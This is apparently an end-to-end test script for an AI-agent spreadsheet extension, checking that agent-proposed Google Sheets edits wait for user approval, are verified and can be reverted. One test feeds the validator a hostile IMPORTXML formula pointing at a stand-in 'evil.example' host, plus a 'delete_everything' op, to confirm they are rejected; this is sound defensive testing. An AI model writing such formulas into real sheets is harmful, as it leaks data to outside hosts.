// End-to-end journey against a real Google Sheet (PRD §5/§14), playing both roles:
//   agent  → WebMCP tools via document.modelContext.executeTool on the sheet page
//   user   → side-panel actions via chrome.runtime messages
// Precondition: the sheet's first tab holds the demo data (A1:E10) and nothing else.
// The run reverts everything it applied, so it can be repeated.
import assert from 'node:assert/strict';
import { connect, extPage } from './lib.mjs';

const b = await connect();
const sheet = (await b.pages()).find(x => /docs\.google\.com\/spreadsheets\/d\//.test(x.url()));
if (!sheet) throw new Error('Open the test spreadsheet first');
await sheet.bringToFront();
const spreadsheetId = /\/d\/([^/]+)/.exec(sheet.url())[1];
const ext = await extPage(b);

async function agent(tool, args = {}) {
  const out = await sheet.evaluate(async (tool, args) => {
    const t = (await document.modelContext.getTools()).find(t => t.name === tool);
    if (!t) return { isError: true, data: { error: `tool ${tool} missing` } };
    const res = JSON.parse(await document.modelContext.executeTool(t, args));
    return { isError: !!res.isError, data: JSON.parse(res.content[0].text) };
  }, tool, args);
  if (out.isError) throw new Error(`${tool}: ${JSON.stringify(out.data)}`);
  return out.data;
}
async function user(type, payload = {}) {
  const r = await ext.evaluate((type, payload) => chrome.runtime.sendMessage({ channel: 'panel', type, ...payload }), type, payload);
  if (!r.ok) throw new Error(`${type}: ${r.error}`);
  return r.result;
}
const step = async (name, fn) => {
  const t0 = Date.now();
  try { const r = await fn(); console.log(`✓ ${name} (${Date.now() - t0} ms)`); return r; }
  catch (e) { console.log(`✗ ${name}: ${e.message}`); throw e; }
};
const applied = [];

try {
  await step('connect: workspace info, edit permission detected', async () => {
    const w = await agent('get_workspace_info', { agent_name: 'E2E agent' });
    assert.equal(w.permissions.can_edit, true);
  });

  await step('read: header/types/currency/dates detected', async () => {
    const d = await agent('describe_sheet');
    assert.deepEqual(d.columns.map(c => `${c.name}:${c.type}`), ['Month:date', 'Revenue:currency', 'COGS:currency', 'Marketing:currency', 'Opex:currency']);
    assert.equal(d.granularity, 'monthly');
    assert.equal(d.data_rows, '2-10');
  });

  const metrics = await step('metrics: deterministic profit & margin', async () => {
    const m = await agent('compute_metrics', { columns: ['Revenue'], revenue_column: 'Revenue', cost_columns: ['COGS', 'Marketing', 'Opex'] });
    assert.equal(m.profit_and_margin.totals.profit, 657900);
    assert.equal(m.profit_and_margin.totals.margin_pct, 15.16);
    return m;
  });

  const profitPlan = await step('propose Profit column → pending, nothing written', async () => {
    const p = await agent('propose_changes', { title: 'Add Profit column', rationale: 'User asked for profit.', assumptions: ['Profit = Revenue - COGS - Marketing - Opex'], operations: [
      { op: 'set_values', range: 'F1', values: [['Profit']] },
      { op: 'write_formula', range: 'F2:F10', formula: '=B{row}-C{row}-D{row}-E{row}' },
      { op: 'format_range', range: 'F1', bold: true },
      { op: 'format_range', range: 'F2:F10', number_format: 'currency', decimals: 0 },
    ] });
    assert.equal(p.status, 'pending_approval');
    const r = await agent('read_range', { range: 'F1:F2' });
    assert.equal(r.rows[0][0].value, null);
    return p;
  });

  await step('approve → executed & verified', async () => {
    const r = await user('plan:approve', { planId: profitPlan.plan_id, approvedIndexes: [0, 1, 2, 3] });
    if (r.status !== 'stale') applied.push(profitPlan.plan_id);
    assert.equal(r.status, 'executed', JSON.stringify(r.execution?.verification));
    const s = await agent('get_plan_status', { plan_id: profitPlan.plan_id });
    assert.equal(s.status, 'executed');
    const f = await agent('read_range', { range: 'F2:F10' });
    assert.equal(f.rows[0][0].formula, '=B2-C2-D2-E2');
    assert.equal(f.rows.reduce((a, r) => a + r[0].value, 0), 657900);
  });

  const fc = await step('forecast: 3-month moving average', async () => {
    const f = await agent('forecast', { columns: ['Revenue', 'COGS', 'Marketing', 'Opex'], method: 'moving_average', periods: 3 });
    assert.ok(f.ok, f.reason);
    assert.deepEqual(f.projected_periods, ['2026-10-01', '2026-11-01', '2026-12-01']);
    assert.equal(f.series[0].projections[0], 536600); // mean(518900, 534200, 556700)
    return f;
  });

  const fcPlan = await step('propose forecast rows + line chart', async () => {
    const p = await agent('propose_changes', { title: 'Q4 forecast and revenue chart', rationale: 'Q4 forecast grounded in actuals.', assumptions: fc.assumptions, operations: [
      { op: 'append_forecast_rows', forecast_id: fc.forecast_id },
      { op: 'add_chart', chart_type: 'line', title: 'Revenue: actual + forecast', domain_range: 'A1:A13', series_ranges: ['B1:B13'], anchor_cell: 'I2' },
    ] });
    assert.equal(p.status, 'pending_approval', JSON.stringify(p.validation));
    return p;
  });

  await step('approve forecast plan → rows written as formulas, chart inserted', async () => {
    const r = await user('plan:approve', { planId: fcPlan.plan_id, approvedIndexes: [0, 1] });
    if (r.status !== 'stale') applied.push(fcPlan.plan_id);
    assert.equal(r.status, 'executed', JSON.stringify(r.execution?.verification) + JSON.stringify(r.execution?.results));
    const rows = await agent('read_range', { range: 'A11:G13' });
    assert.equal(rows.rows[0][1].formula, '=AVERAGE(B8:B10)');
    assert.equal(rows.rows[0][1].value, 536600);
    assert.equal(rows.rows[0][5].formula, '=B11-C11-D11-E11');
    assert.equal(rows.rows[0][6].value, 'Forecast');
    assert.equal(rows.rows[0][0].date, '2026-10-01');
  });

  await step('stale preview: sheet edit after proposal invalidates plan', async () => {
    const p = await agent('propose_changes', { title: 'Note', operations: [{ op: 'set_values', range: 'K20', values: [['note']] }] });
    await user('debug:driver', { spreadsheetId, op: 'pasteBlock', args: { sheet: 'Sheet1', range: 'K22', rows: [['user edit']] } });
    const c = await user('plan:checkStale', { planId: p.plan_id });
    assert.equal(c.status, 'stale');
    await assert.rejects(user('plan:approve', { planId: p.plan_id, approvedIndexes: [0] }));
    await user('debug:driver', { spreadsheetId, op: 'clearRange', args: { sheet: 'Sheet1', range: 'K22' } });
    assert.equal((await agent('read_range', { range: 'K20' })).rows[0][0].value, null);
  });

  await step('invalid ops rejected before execution', async () => {
    const p = await agent('propose_changes', { title: 'Bad', operations: [
      { op: 'write_formula', range: 'L2:L3', formula: '=IMPORTXML("https://evil.example","//a")' },
      { op: 'set_values', range: 'B2', values: [[1]] },
      { op: 'delete_everything' },
    ] });
    assert.equal(p.status, 'invalid');
    assert.equal(p.validation.errors.length, 3);
  });

  await step('revision request reaches the agent', async () => {
    const p = await agent('propose_changes', { title: 'Margin column', operations: [{ op: 'set_values', range: 'H1', values: [['Margin']] }] });
    await user('plan:decide', { planId: p.plan_id, decision: 'revise', feedback: 'Use a percent format and put it next to Profit' });
    const s = await agent('get_plan_status', { plan_id: p.plan_id });
    assert.equal(s.status, 'revision_requested');
    assert.match(s.user_decision.user_feedback, /percent/);
  });

  const scen = await step('what-if: marketing -10% on forecast, baseline untouched', async () => {
    const s = await agent('run_scenario', { name: 'Marketing -10%', revenue_column: 'Revenue', cost_columns: ['COGS', 'Marketing', 'Opex'], adjustments: [{ column: 'Marketing', change_pct: -10 }], forecast_id: fc.forecast_id, notes: 'Assumes no revenue impact.' });
    assert.ok(s.impact.profit_change > 0);
    assert.match(s.label, /HYPOTHETICAL/);
    const d = await agent('read_range', { range: 'D11' });
    assert.equal(d.rows[0][0].formula, '=AVERAGE(D8:D10)');
    return s;
  });

  await step('insights: citations verified, agent memory flagged', async () => {
    const r = await agent('post_insights', { title: 'Q4 outlook', findings: [
      { statement: 'Revenue grew every month Jan–Sep (avg 3.84% MoM).', evidence: [{ type: 'sheet_range', ref: 'Sheet1!B2:B10' }, { type: 'metric', ref: metrics.metrics_id }] },
      { statement: 'Uncited claim', evidence: [{ type: 'sheet_range', ref: 'Sheet1!Z100' }] },
    ], suggestions: [
      { statement: 'Q4 forecast (~$1.61M) is below the $1.8M Q4 target; consider the marketing scenario.', rationale: 'Target from company goals.', confidence: 'medium', sources: [{ type: 'agent_memory', ref: 'FY26 goals: Q4 revenue target $1.8M' }, { type: 'metric', ref: fc.forecast_id }] },
    ] });
    assert.equal(r.citation_problems.length, 2); // empty range + finding without verifiable evidence
  });

  await step('sync: user approves summary (scenario excluded), agent fetches & confirms', async () => {
    const cands = await user('sync:candidates', { spreadsheetId });
    const chosen = cands.filter(c => c.checked);
    assert.ok(chosen.some(c => c.kind === 'model_change'));
    assert.ok(!chosen.some(c => c.kind === 'scenario'));
    assert.ok(cands.some(c => c.kind === 'scenario' && /HYPOTHETICAL/.test(c.label)));
    await user('sync:approve', { spreadsheetId, sheetTitle: 'E2E', items: chosen });
    const s = await agent('get_approved_summary');
    assert.equal(s.available, true);
    assert.match(s.markdown, /Applied model changes/);
    assert.doesNotMatch(s.markdown, /HYPOTHETICAL scenario/);
    const c = await agent('confirm_summary_saved', { summary_id: s.summary_id, destination: 'E2E memory store', reference: 'mem://e2e/1' });
    assert.equal(c.ok, true);
  });

  await step('history: approvals, executions and errors recorded', async () => {
    const h = await agent('get_history', { limit: 100 });
    const types = new Set(h.events.map(e => e.type));
    for (const t of ['plan_proposed', 'plan_approved', 'plan_executed', 'plan_stale', 'sync_confirmed']) assert.ok(types.has(t), t);
  });
} finally {
  if (process.argv.includes('--keep')) applied.length = 0;
  for (const id of applied.reverse()) {
    await step(`revert ${id}`, async () => {
      const r = await user('plan:revert', { planId: id, force: false });
      assert.equal(r.ok, true, JSON.stringify(r));
    }).catch(() => {});
  }
  if (!process.argv.includes('--keep')) await step('sheet back to demo data only', async () => {
    const r = await agent('describe_sheet');
    assert.equal(r.used_range, 'Sheet1!A1:E10');
  }).catch(() => {});
  await ext.close();
  await b.disconnect();
}
